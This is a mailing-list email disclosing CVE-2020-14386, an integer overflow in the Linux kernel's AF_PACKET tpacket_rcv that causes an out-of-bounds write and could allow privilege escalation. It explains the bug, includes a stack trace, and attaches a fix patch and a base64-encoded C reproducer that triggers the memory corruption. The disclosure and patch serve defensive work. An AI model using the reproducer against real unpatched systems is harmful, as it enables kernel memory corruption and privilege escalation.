Return-Path: <netdev-owner@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
	by mail.lfdr.de (Postfix) with ESMTP id 249A825C83D
	for <lists+netdev@lfdr.de>; Thu,  3 Sep 2020 19:51:36 +0200 (CEST)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S1727065AbgICRvd (ORCPT <rfc822;lists+netdev@lfdr.de>);
        Thu, 3 Sep 2020 13:51:33 -0400
Received: from mx0a-00169c01.pphosted.com ([67.231.148.124]:45334 "EHLO
        mx0b-00169c01.pphosted.com" rhost-flags-OK-OK-OK-FAIL)
        by vger.kernel.org with ESMTP id S1726025AbgICRvb (ORCPT
        <rfc822;netdev@vger.kernel.org>); Thu, 3 Sep 2020 13:51:31 -0400
X-Greylist: delayed 2641 seconds by postgrey-1.27 at vger.kernel.org; Thu, 03 Sep 2020 13:51:30 EDT
Received: from pps.filterd (m0045114.ppops.net [127.0.0.1])
        by mx0a-00169c01.pphosted.com (8.16.0.42/8.16.0.42) with SMTP id 083H4UEp027424
        for <netdev@vger.kernel.org>; Thu, 3 Sep 2020 10:07:28 -0700
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=paloaltonetworks.com;
 h=mime-version : from : date : message-id : subject : to : content-type;
 s=PPS12012017; bh=aROLuGhwDTX56uELcvWDp6fyM5YyV2q/A8K7lwIqlpo=;
 b=cHvATtCydVO6YAJKCcgamAp/uFnLtPAVO4xcJH7GyBHhAjzpd9a97Qcgefwx+1afx0My
 eX9bcLNpiDzkBJLpRCC5SLqH5l4M9PErJ+xhRZ5Ur13onCc9XGyJ1UnDkFjr6aWRQIxi
 2ZWwrDMczF+ogveWmE/01dAVZTzJOf4Ap6a54D+NaJrtP8dgBlV2Yb0L5iZSUbWssPFu
 6xn8LuyyuHsQZaFlsyKhu3atypYneN/7W/Z7/2roBxf1q/vgdeMSzYKrktp1amB5yddq
 S1obWM4A6L0njM5zPg1bADnu0wdZbHDD3n98HkN09KDi+6YArPXfXu9tqXnc3IynzaL9 IQ== 
Received: from mail-qk1-f200.google.com (mail-qk1-f200.google.com [209.85.222.200])
        by mx0a-00169c01.pphosted.com with ESMTP id 337k1k4b0w-1
        (version=TLSv1.2 cipher=ECDHE-RSA-AES128-GCM-SHA256 bits=128 verify=NOT)
        for <netdev@vger.kernel.org>; Thu, 03 Sep 2020 10:07:28 -0700
Received: by mail-qk1-f200.google.com with SMTP id x191so1972223qkb.3
        for <netdev@vger.kernel.org>; Thu, 03 Sep 2020 10:07:27 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=paloaltonetworks-com.20150623.gappssmtp.com; s=20150623;
        h=mime-version:from:date:message-id:subject:to;
        bh=aROLuGhwDTX56uELcvWDp6fyM5YyV2q/A8K7lwIqlpo=;
        b=JKfbt3R1KNhYKgUKQ+g5sxdyb4QoXDrUV7OpQfHAM4nSjJajTh5qpnEgDyxzDfHpTI
         VveNjcxCAhb0Fntiz0sQhYfsmPJz3LFbhjlwxIkbgpT1wgdmawQPES6XVdI19Z3YreTv
         xheJRIFGiyiE/C0BSU6Zj0Q1zyHah/c5NaiwBxper7jH3/rnNb14/ahwlRIomjTL+GMU
         GrG1t+o6lsWCdXurUjURq8NNggCO+q8HGGFZvsVUAYnAX0ZMzAkAo3Jj/mcohu/0MhgK
         6wCCsr+pSGLtyCSTFZ9/R0j6+72fUQR3m9yiLQkbQlhS7wgqj1CCYfwQqnbTTU7tGgmr
         Cx2g==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=aROLuGhwDTX56uELcvWDp6fyM5YyV2q/A8K7lwIqlpo=;
        b=Ttt4BhdoJffWnRi6w5sOKbBOmyIKdBvY9VMmw0WrnGp1Z3GY4XX2SKTrkZlg6HeSNX
         ZEtCroGAGjXHseyu7u32mhS7h/1yPV3fQcrCpPIDOUWH6tU4gA/6WnPrknq4GvGfQx4z
         wdYP5NzYEHiPGPeOmznGk5v0OEH2m7rZKzLkPh8eqoJjqmd+kbR+t+deusaQtvdtb61J
         4wZzmBPs3NATKNt4VGtjwmWIgnXQmOZWxn0mw6TVeSjt/2aEBmOqwcTY6hUjEDTQb66D
         4wfdeAg1z9Gs8iTTfT3KLKCQJbzK/SiJ3M2y78Df15vYoZN1OiOsFY4DtEucD9Tu0LSH
         pJJQ==
X-Gm-Message-State: AOAM530B6135EAKYp+niPPRXx0+sSDbVSZMLgb3oBzQ83pd3PrJTWLUK
        AK4tCvz686ZBMzuvzcauCRj6Zfh81VZag2abh6kHimm6ZjLAL+Y/4CI56EOpkoBwxendqm0dxfS
        7By9xog+l8ABXhxxRiEujCVVeQpIHc5mJ
X-Received: by 2002:a05:6214:178c:: with SMTP id ct12mr2890554qvb.12.1599152846578;
        Thu, 03 Sep 2020 10:07:26 -0700 (PDT)
X-Google-Smtp-Source: ABdhPJzVqyVE4Y3rsuIHJvfh6U6feo04rvWbxMRj3pO45OhuCt7E8/zj3J3F5vFlnAvh5cGCUNqc1LsrAcQuNcvQSXE=
X-Received: by 2002:a05:6214:178c:: with SMTP id ct12mr2890517qvb.12.1599152846072;
 Thu, 03 Sep 2020 10:07:26 -0700 (PDT)
MIME-Version: 1.0
From:   Or Cohen <orcohen@paloaltonetworks.com>
Date:   Thu, 3 Sep 2020 20:07:15 +0300
Message-ID: <CAM6JnLf_8nwzq+UGO+amXpeApCDarJjwzOEHQd5qBhU7YKm3DQ@mail.gmail.com>
Subject: Vulnerability report - af_packet.c - CVE-2020-14386
To:     netdev@vger.kernel.org
Content-Type: multipart/mixed; boundary="000000000000553e8b05ae6bc9c0"
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10434:6.0.235,18.0.687
 definitions=2020-09-03_10:2020-09-03,2020-09-03 signatures=0
X-Proofpoint-Spam-Details: rule=outbound_spam_notspam policy=outbound_spam score=0 clxscore=1011
 lowpriorityscore=0 priorityscore=1501 bulkscore=0 spamscore=0
 impostorscore=0 mlxscore=0 malwarescore=0 suspectscore=3 phishscore=0
 adultscore=0 mlxlogscore=999 classifier=spam adjust=0 reason=mlx
 scancount=1 engine=8.12.0-2006250000 definitions=main-2009030160
Sender: netdev-owner@vger.kernel.org
Precedence: bulk
List-ID: <netdev.vger.kernel.org>
X-Mailing-List: netdev@vger.kernel.org

--000000000000553e8b05ae6bc9c0
Content-Type: text/plain; charset="UTF-8"

Hi,
I already reported the issue to security@kernel.org and
linux-distros@vs.openwall.org and CVE-2020-14386 was assigned.

The report is as follows: ( a proposed patch and a reproducer are attached)

I discovered a bug which leads to a memory corruption in
(net/packet/af_packet.c). It can be exploited to gain root privileges
from unprivileged processes.

To create AF_PACKET sockets you need CAP_NET_RAW in your network
namespace, which can be acquired by unprivileged processes on systems
where unprivileged namespaces are enabled (Ubuntu, Fedora, etc).

I discovered the vulnerability while auditing the 5.7 kernel sources.

The bug occurs in tpacket_rcv function, when calculating the netoff
variable (unsigned short), po->tp_reserve (unsigned int) is added to
it which can overflow netoff so it gets a small value.

macoff is calculated using: "macoff = netoff - maclen", we can control
macoff so it will receive a small value (specifically, smaller then
sizeof(struct virtio_net_hdr)).

Later, when running the following code:
...
if (do_vnet &&
   virtio_net_hdr_from_skb(skb, h.raw + macoff -
sizeof(struct virtio_net_hdr),
...

If do_vnet is set, and because macoff < sizeof(struct virtio_net_hdr)
a pointer to a memory area before the h.raw buffer will be sent to
virtio_net_hdr_from_skb. This can lead to an out-of-bounds write of
1-10 bytes, controlled by the user.

The h.raw buffer is allocated in alloc_pg_vec and it's size is
controlled by the user.

The stack trace is as follows at the time of the crash: ( linux v5.7 )

#0  memset_erms () at arch/x86/lib/memset_64.S:66
#1  0xffffffff831934a6 in virtio_net_hdr_from_skb
(little_endian=<optimized out>, has_data_valid=<optimized out>,
    vlan_hlen=<optimized out>, hdr=<optimized out>, skb=<optimized
out>) at ./include/linux/virtio_net.h:134
#2  tpacket_rcv (skb=0xffff8881ef539940, dev=0xffff8881de534000,
pt=<optimized out>, orig_dev=<optimized out>)
        at net/packet/af_packet.c:2287
#3  0xffffffff82c52e47 in dev_queue_xmit_nit (skb=0xffff8881ef5391c0,
dev=<optimized out>) at net/core/dev.c:2276
#4  0xffffffff82c5e3d4 in xmit_one (more=<optimized out>,
txq=<optimized out>, dev=<optimized out>,
            skb=<optimized out>) at net/core/dev.c:3473
#5  dev_hard_start_xmit (first=0xffffc900001c0ff6, dev=0x0
<fixed_percpu_data>, txq=0xa <fixed_percpu_data+10>,
    ret=<optimized out>) at net/core/dev.c:3493
#6  0xffffffff82c5fc7e in __dev_queue_xmit (skb=0xffff8881ef5391c0,
sb_dev=<optimized out>) at net/core/dev.c:4052
#7  0xffffffff831982d3 in packet_snd (len=65536, msg=<optimized out>,
sock=<optimized out>) 0001-net-packet-fix-overflow-in-tpacket_rcv
at net/packet/af_packet.c:2979
#8  packet_sendmsg (sock=<optimized out>, msg=<optimized out>,
len=65536) at net/packet/af_packet.c:3004
#9  0xffffffff82be09ed in sock_sendmsg_nosec (msg=<optimized out>,
sock=<optimized out>) at net/socket.c:652
#10 sock_sendmsg (sock=0xffff8881e8ff56c0, msg=0xffff8881de56fd88) at
net/socket.c:672

Files attached:
A proposed patch - 0001-net-packet-fix-overflow-in-tpacket_rcv.patch
A reproducer for the bug - trigger_bug.c

We are currently working on an exploit for getting root privileges
from unprivileged context using this bug.

If there is a problem with the patch please let me know and I will fix it.

Or Cohen
Palo Alto Networks

--000000000000553e8b05ae6bc9c0
Content-Type: application/octet-stream; 
	name="0001-net-packet-fix-overflow-in-tpacket_rcv.patch"
Content-Disposition: attachment; 
	filename="0001-net-packet-fix-overflow-in-tpacket_rcv.patch"
Content-Transfer-Encoding: base64
Content-ID: <f_ken291en0>
X-Attachment-Id: f_ken291en0

RnJvbSAzYWQwNGM5NTU1YjkzYWM2YTM3NGIwOTIxYWQ0MTg0OWNhZjIyMDY3IE1vbiBTZXAgMTcg
MDA6MDA6MDAgMjAwMQpGcm9tOiBPciBDb2hlbiA8b3Jjb2hlbkBwYWxvYWx0b25ldHdvcmtzLmNv
bT4KRGF0ZTogU3VuLCAzMCBBdWcgMjAyMCAyMDowNDo1MSArMDMwMApTdWJqZWN0OiBbUEFUQ0hd
IG5ldC9wYWNrZXQ6IGZpeCBvdmVyZmxvdyBpbiB0cGFja2V0X3JjdgoKVXNpbmcgdHBfcmVzZXJ2
ZSB0byBjYWxjdWxhdGUgbmV0b2ZmIGNhbiBvdmVyZmxvdyBhcwp0cF9yZXNlcnZlIGlzIHVuc2ln
bmVkIGludCBhbmQgbmV0b2ZmIGlzIHVuc2lnbmVkIHNob3J0LgoKVGhpcyBtYXkgbGVhZCB0byBt
YWNvZmYgcmVjZXZpbmcgYSBzbWFsbGVyIHZhbHVlIHRoZW4Kc2l6ZW9mKHN0cnVjdCB2aXJ0aW9f
bmV0X2hkciksIGFuZCBpZiBwby0+aGFzX3ZuZXRfaGRyCmlzIHNldCwgYW4gb3V0LW9mLWJvdW5k
cyB3cml0ZSB3aWxsIG9jY3VyIHdoZW4KY2FsbGluZyB2aXJ0aW9fbmV0X2hkcl9mcm9tX3NrYi4K
ClRoZSBidWcgaXMgZml4ZWQgYnkgY29udmVydGluZyBuZXRvZmYgdG8gdW5zaWduZWQgaW50CmFu
ZCBjaGVja2luZyBpZiBpdCBleGNlZWRzIFVTSFJUX01BWC4KCkZpeGVzOiA4OTEzMzM2YTdlOGQg
KCJwYWNrZXQ6IGFkZCBQQUNLRVRfUkVTRVJWRSBzb2Nrb3B0IikKU2lnbmVkLW9mZi1ieTogT3Ig
Q29oZW4gPG9yY29oZW5AcGFsb2FsdG9uZXR3b3Jrcy5jb20+Ci0tLQogbmV0L3BhY2tldC9hZl9w
YWNrZXQuYyB8IDcgKysrKysrLQogMSBmaWxlIGNoYW5nZWQsIDYgaW5zZXJ0aW9ucygrKSwgMSBk
ZWxldGlvbigtKQoKZGlmZiAtLWdpdCBhL25ldC9wYWNrZXQvYWZfcGFja2V0LmMgYi9uZXQvcGFj
a2V0L2FmX3BhY2tldC5jCmluZGV4IDI5YmQ0MDVhZGJiZC4uZDM3NDM1OTA2ODU5IDEwMDY0NAot
LS0gYS9uZXQvcGFja2V0L2FmX3BhY2tldC5jCisrKyBiL25ldC9wYWNrZXQvYWZfcGFja2V0LmMK
QEAgLTIxNjgsNyArMjE2OCw4IEBAIHN0YXRpYyBpbnQgdHBhY2tldF9yY3Yoc3RydWN0IHNrX2J1
ZmYgKnNrYiwgc3RydWN0IG5ldF9kZXZpY2UgKmRldiwKIAlpbnQgc2tiX2xlbiA9IHNrYi0+bGVu
OwogCXVuc2lnbmVkIGludCBzbmFwbGVuLCByZXM7CiAJdW5zaWduZWQgbG9uZyBzdGF0dXMgPSBU
UF9TVEFUVVNfVVNFUjsKLQl1bnNpZ25lZCBzaG9ydCBtYWNvZmYsIG5ldG9mZiwgaGRybGVuOwor
CXVuc2lnbmVkIHNob3J0IG1hY29mZiwgaGRybGVuOworCXVuc2lnbmVkIGludCBuZXRvZmY7CiAJ
c3RydWN0IHNrX2J1ZmYgKmNvcHlfc2tiID0gTlVMTDsKIAlzdHJ1Y3QgdGltZXNwZWM2NCB0czsK
IAlfX3UzMiB0c19zdGF0dXM7CkBAIC0yMjM3LDYgKzIyMzgsMTAgQEAgc3RhdGljIGludCB0cGFj
a2V0X3JjdihzdHJ1Y3Qgc2tfYnVmZiAqc2tiLCBzdHJ1Y3QgbmV0X2RldmljZSAqZGV2LAogCQl9
CiAJCW1hY29mZiA9IG5ldG9mZiAtIG1hY2xlbjsKIAl9CisJaWYgKG5ldG9mZiA+IFVTSFJUX01B
WCkgeworCQlhdG9taWNfaW5jKCZwby0+dHBfZHJvcHMpOworCQlnb3RvIGRyb3Bfbl9yZXN0b3Jl
OworCX0KIAlpZiAocG8tPnRwX3ZlcnNpb24gPD0gVFBBQ0tFVF9WMikgewogCQlpZiAobWFjb2Zm
ICsgc25hcGxlbiA+IHBvLT5yeF9yaW5nLmZyYW1lX3NpemUpIHsKIAkJCWlmIChwby0+Y29weV90
aHJlc2ggJiYKLS0gCjIuMTcuMQoK
--000000000000553e8b05ae6bc9c0
Content-Type: application/octet-stream; name="trigger_bug.c"
Content-Disposition: attachment; filename="trigger_bug.c"
Content-Transfer-Encoding: base64
Content-ID: <f_ken2970p1>
X-Attachment-Id: f_ken2970p1

CiNkZWZpbmUgX0dOVV9TT1VSQ0UKCiNpbmNsdWRlIDxzY2hlZC5oPgojaW5jbHVkZSA8dW5pc3Rk
Lmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzeXMv
dHlwZXMuaD4KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4KI2luY2x1ZGUgPGxpbnV4L2lmX3BhY2tl
dC5oPgojaW5jbHVkZSA8bmV0L2V0aGVybmV0Lmg+CiNpbmNsdWRlIDxhcnBhL2luZXQuaD4KI2lu
Y2x1ZGUgPHN5cy9zdGF0Lmg+CiNpbmNsdWRlIDxmY250bC5oPgojaW5jbHVkZSA8c3RyaW5nLmg+
CiNpbmNsdWRlIDxzdGRib29sLmg+CiNpbmNsdWRlIDxzdGRhcmcuaD4KI2luY2x1ZGUgPG5ldC9p
Zi5oPgojaW5jbHVkZSA8c3RkaW50Lmg+CgoKYm9vbCB3cml0ZV9maWxlKGNvbnN0IGNoYXIqIGZp
bGUsIGNvbnN0IGNoYXIqIHdoYXQsIC4uLikgewoJY2hhciBidWZbMTAyNF07Cgl2YV9saXN0IGFy
Z3M7Cgl2YV9zdGFydChhcmdzLCB3aGF0KTsKCXZzbnByaW50ZihidWYsIHNpemVvZihidWYpLCB3
aGF0LCBhcmdzKTsKCXZhX2VuZChhcmdzKTsKCWJ1ZltzaXplb2YoYnVmKSAtIDFdID0gMDsKCWlu
dCBsZW4gPSBzdHJsZW4oYnVmKTsKCglpbnQgZmQgPSBvcGVuKGZpbGUsIE9fV1JPTkxZIHwgT19D
TE9FWEVDKTsKCWlmIChmZCA9PSAtMSkKCQlyZXR1cm4gZmFsc2U7CglpZiAod3JpdGUoZmQsIGJ1
ZiwgbGVuKSAhPSBsZW4pIHsKCQljbG9zZShmZCk7CgkJcmV0dXJuIGZhbHNlOwoJfQoJY2xvc2Uo
ZmQpOwoJcmV0dXJuIHRydWU7Cn0KCgp2b2lkIHNldHVwX3NhbmRib3goKSB7CglpbnQgcmVhbF91
aWQgPSBnZXR1aWQoKTsKCWludCByZWFsX2dpZCA9IGdldGdpZCgpOwoKICAgICAgICBpZiAodW5z
aGFyZShDTE9ORV9ORVdVU0VSKSAhPSAwKSB7CgkJcGVycm9yKCJbLV0gdW5zaGFyZShDTE9ORV9O
RVdVU0VSKSIpOwoJCWV4aXQoRVhJVF9GQUlMVVJFKTsKCX0KCiAgICAgICAgaWYgKHVuc2hhcmUo
Q0xPTkVfTkVXTkVUKSAhPSAwKSB7CgkJcGVycm9yKCJbLV0gdW5zaGFyZShDTE9ORV9ORVdORVQp
Iik7CgkJZXhpdChFWElUX0ZBSUxVUkUpOwoJfQoKCWlmICghd3JpdGVfZmlsZSgiL3Byb2Mvc2Vs
Zi9zZXRncm91cHMiLCAiZGVueSIpKSB7CgkJcGVycm9yKCJbLV0gd3JpdGVfZmlsZSgvcHJvYy9z
ZWxmL3NldF9ncm91cHMpIik7CgkJZXhpdChFWElUX0ZBSUxVUkUpOwoJfQoJaWYgKCF3cml0ZV9m
aWxlKCIvcHJvYy9zZWxmL3VpZF9tYXAiLCAiMCAlZCAxXG4iLCByZWFsX3VpZCkpewoJCXBlcnJv
cigiWy1dIHdyaXRlX2ZpbGUoL3Byb2Mvc2VsZi91aWRfbWFwKSIpOwoJCWV4aXQoRVhJVF9GQUlM
VVJFKTsKCX0KCWlmICghd3JpdGVfZmlsZSgiL3Byb2Mvc2VsZi9naWRfbWFwIiwgIjAgJWQgMVxu
IiwgcmVhbF9naWQpKSB7CgkJcGVycm9yKCJbLV0gd3JpdGVfZmlsZSgvcHJvYy9zZWxmL2dpZF9t
YXApIik7CgkJZXhpdChFWElUX0ZBSUxVUkUpOwoJfQoKCWNwdV9zZXRfdCBteV9zZXQ7CglDUFVf
WkVSTygmbXlfc2V0KTsKCUNQVV9TRVQoMCwgJm15X3NldCk7CglpZiAoc2NoZWRfc2V0YWZmaW5p
dHkoMCwgc2l6ZW9mKG15X3NldCksICZteV9zZXQpICE9IDApIHsKCQlwZXJyb3IoIlstXSBzY2hl
ZF9zZXRhZmZpbml0eSgpIik7CgkJZXhpdChFWElUX0ZBSUxVUkUpOwoJfQoKCWlmIChzeXN0ZW0o
Ii9zYmluL2lmY29uZmlnIGxvIHVwIikgIT0gMCkgewoJCXBlcnJvcigiWy1dIHN5c3RlbSgvc2Jp
bi9pZmNvbmZpZyBsbyB1cCkiKTsKCQlleGl0KEVYSVRfRkFJTFVSRSk7Cgl9Cgp9Cgp2b2lkIHBh
Y2tldF9zb2NrZXRfc2VuZChpbnQgcywgY2hhciAqYnVmZmVyLCBpbnQgc2l6ZSkgewoJc3RydWN0
IHNvY2thZGRyX2xsIHNhOwoJbWVtc2V0KCZzYSwgMCwgc2l6ZW9mKHNhKSk7CglzYS5zbGxfaWZp
bmRleCA9IGlmX25hbWV0b2luZGV4KCJsbyIpOwoJc2Euc2xsX2hhbGVuID0gRVRIX0FMRU47CgoJ
aWYgKHNlbmR0byhzLCBidWZmZXIsIHNpemUsIDAsIChzdHJ1Y3Qgc29ja2FkZHIgKikmc2EsCgkJ
CXNpemVvZihzYSkpIDwgMCkgewoJCXBlcnJvcigiWy1dIHNlbmR0byhTT0NLX1JBVykiKTsKCQll
eGl0KEVYSVRfRkFJTFVSRSk7Cgl9Cn0KCnZvaWQgbG9vcGJhY2tfc2VuZChjaGFyICpidWZmZXIs
IGludCBzaXplKSB7CglpbnQgcyA9IHNvY2tldChBRl9QQUNLRVQsIFNPQ0tfUkFXLCBJUFBST1RP
X1JBVyk7CglpZiAocyA9PSAtMSkgewoJCXBlcnJvcigiWy1dIHNvY2tldChTT0NLX1JBVykiKTsK
CQlleGl0KEVYSVRfRkFJTFVSRSk7Cgl9CgoJcGFja2V0X3NvY2tldF9zZW5kKHMsIGJ1ZmZlciwg
c2l6ZSk7Cn0KCgoKaW50IG1haW4oKQp7CgoJc2V0dXBfc2FuZGJveCgpOwoKCWludCBzID0gc29j
a2V0KEFGX1BBQ0tFVCwgU09DS19SQVcsIGh0b25zKEVUSF9QX0FMTCkgKTsKCWlmIChzIDwgMCkK
CXsKCQlwZXJyb3IoInNvY2tldFxuIik7CgkJcmV0dXJuIDE7Cgl9CgoJaW50IHYgPSBUUEFDS0VU
X1YyOwoJaW50IHJ2ID0gc2V0c29ja29wdChzLCBTT0xfUEFDS0VULCBQQUNLRVRfVkVSU0lPTiwg
JnYsIHNpemVvZih2KSk7CglpZiAocnYgPCAwKQoJewoJCXBlcnJvcigic2V0c29ja29wdChQQUNL
RVRfVkVSU0lPTilcbiIpOwoJCXJldHVybiAxOwoJfQoKCXYgPSAxOwoJcnYgPSBzZXRzb2Nrb3B0
KHMsIFNPTF9QQUNLRVQsIFBBQ0tFVF9WTkVUX0hEUiwgJnYsIHNpemVvZih2KSk7CglpZiAocnYg
PCAwKQoJewoJCXBlcnJvcigic2V0c29ja29wdChQQUNLRVRfVk5FVF9IRFIpXG4iKTsKCQlyZXR1
cm4gMTsKCX0KCgl2ID0gMHhmZmZmIC0gMjAgLSAweDMwIC03OwoJcnYgPSBzZXRzb2Nrb3B0KHMs
IFNPTF9QQUNLRVQsIFBBQ0tFVF9SRVNFUlZFLCAmdiwgc2l6ZW9mKHYpKTsKCWlmIChydiA8IDAp
Cgl7CgkJcGVycm9yKCJzZXRzb2Nrb3B0KFBBQ0tFVF9SRVNFUlZFKVxuIik7CgkJcmV0dXJuIDE7
Cgl9CgoJc3RydWN0IHRwYWNrZXRfcmVxIHJlcTsKCW1lbXNldCgmcmVxLCAwLCBzaXplb2YocmVx
KSk7CglyZXEudHBfYmxvY2tfc2l6ZSA9IDB4ODAwMDAwOwoJcmVxLnRwX2ZyYW1lX3NpemUgPSAw
eDExMDAwOwoJcmVxLnRwX2Jsb2NrX25yID0gMTsKCXJlcS50cF9mcmFtZV9uciA9IChyZXEudHBf
YmxvY2tfc2l6ZSAqIHJlcS50cF9ibG9ja19ucikgLyByZXEudHBfZnJhbWVfc2l6ZTsKCglydiA9
IHNldHNvY2tvcHQocywgU09MX1BBQ0tFVCwgUEFDS0VUX1JYX1JJTkcsICZyZXEsIHNpemVvZihy
ZXEpKTsKCWlmIChydiA8IDApIHsKCQlwZXJyb3IoIlstXSBzZXRzb2Nrb3B0KFBBQ0tFVF9SWF9S
SU5HKSIpOwoJCWV4aXQoRVhJVF9GQUlMVVJFKTsKCX0KCgoJc3RydWN0IHNvY2thZGRyX2xsIHNh
OwoJbWVtc2V0KCZzYSwgMCwgc2l6ZW9mKHNhKSk7CglzYS5zbGxfZmFtaWx5ID0gUEZfUEFDS0VU
OwoJc2Euc2xsX3Byb3RvY29sID0gaHRvbnMoRVRIX1BfQUxMKTsKCXNhLnNsbF9pZmluZGV4ID0g
aWZfbmFtZXRvaW5kZXgoImxvIik7CglzYS5zbGxfaGF0eXBlID0gMDsKCXNhLnNsbF9wa3R0eXBl
ID0gMDsKCXNhLnNsbF9oYWxlbiA9IDA7CgoJcnYgPSBiaW5kKHMsIChzdHJ1Y3Qgc29ja2FkZHIg
Kikmc2EsIHNpemVvZihzYSkpOwoJaWYgKHJ2IDwgMCkgewoJCXBlcnJvcigiWy1dIGJpbmQoQUZf
UEFDS0VUKSIpOwoJCWV4aXQoRVhJVF9GQUlMVVJFKTsKCX0KCgl1aW50MzJfdCBzaXplID0gMHg4
MDAwMC84OwoJY2hhciogYnVmID0gbWFsbG9jKHNpemUpOwoJaWYoIWJ1ZikKCXsKCQlwZXJyb3Io
Im1hbGxvY1xuIik7CgkJZXhpdChFWElUX0ZBSUxVUkUpOwoJfQoJbWVtc2V0KGJ1ZiwweGNlLHNp
emUpOwoJbG9vcGJhY2tfc2VuZChidWYsc2l6ZSk7CgoJcmV0dXJuIDA7Cn0KCgo=
--000000000000553e8b05ae6bc9c0--
